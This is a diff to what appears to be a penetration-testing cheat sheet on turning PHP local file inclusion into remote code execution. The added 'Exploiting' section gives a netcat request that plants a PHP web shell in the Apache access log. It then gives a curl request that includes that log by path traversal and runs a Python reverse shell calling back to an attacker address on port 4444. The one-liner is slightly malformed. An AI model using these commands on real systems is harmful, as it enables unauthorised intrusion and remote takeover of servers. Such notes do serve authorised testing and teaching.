@@ -330,10 +330,14 @@ odd characters or double encoded
 Include the following in a GET request and when you view the access.log file it will show the php info verison  
 `/<?php phpinfo(); ?>`  
 
+### Exploiting 
+
+Request 1  
 `$ nc secureapplication.example 80`   
 `GET /<?php system($_GET['cmd']);?>`
 
-`python -c socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+Request 2  
+ `curl 10.10.10.10/index.php?view=../../var/log/apache2/access.log&cmd=python+-c+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 Other variations of php LFI to RCE
 
